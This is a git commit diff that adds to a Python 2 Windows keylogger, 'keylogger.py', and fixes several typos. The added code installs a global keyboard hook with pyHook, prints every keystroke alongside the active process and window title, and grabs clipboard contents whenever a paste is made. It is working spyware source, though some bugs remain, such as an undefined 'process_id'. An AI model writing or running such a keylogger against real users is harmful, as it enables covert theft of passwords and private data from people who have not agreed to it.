27e12217985c409c7da696c9f3cc1710328c896f
hiroaki takeo <hiroaki takeo>
2016-09-19 01:34:46 +0900

    Adding new code to keylloger.py

--- keylogger.py
+++ keylogger.py
@@ -3,14 +3,15 @@
 from ctypes import *
 import pythoncom
 import pyHook
-import win32clipborad
+import win32clipboard
 
 user32   = windll.user32
 kernel32 = windll.kernel32
 psapi    = windll.psapi
-current_windows = None
+current_window = None
 
 def get_current_process():
+
 	hwnd = user32.GetForegroundWindow()
 
 	pid = c_ulong(0)
@@ -21,14 +22,41 @@ def get_current_process():
 	executable = create_string_buffer("\x00"*512)
 	h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
 
-	psapi.GetModuleBaseName(h_process, None, byref(executable), 512)
+	psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
 
 	window_title = create_string_buffer("\x00"*512)
-	lenght = user32.GetWindowTestA(hwnd, byref(window_title), 512)
+	lenght = user32.GetWindowTextA(hwnd, byref(window_title), 512)
 
 	print
 	print '[PID: %s - %s - %s]' % (process_id, executable.value, window_title.value)
 	print
 
-	kernel32.CloseHnadle(hwnd)
-	kernel32.CloseHnadle(h_process)
+	kernel32.CloseHandle(hwnd)
+	kernel32.CloseHandle(h_process)
+
+def KeyStroke(event):
+	global current_window
+
+	if event.WindowName != current_window:
+		current_window = event.WindowName
+		get_current_process()
+
+	if event.Ascii > 32 and event.Ascii<127:
+		print chr(event.Ascii)
+	else:
+		if event.Key == "V":
+			win32clipboard.OpenClipboard()
+			pasted_value = win32clipboard.GetClipboardData()
+			win32clipboard.CloseClipboard()
+
+			print "[PASTE] - %s" % (pasted_value)
+		else:
+			print "[%s] " % event.Key,
+	return True
+
+if __name__ == '__main__':
+	kl = pyHook.HookManager()
+	kl.KeyDown = KeyStroke
+
+	kl.HookKeyboard()
+	pythoncom.PumpMessages()
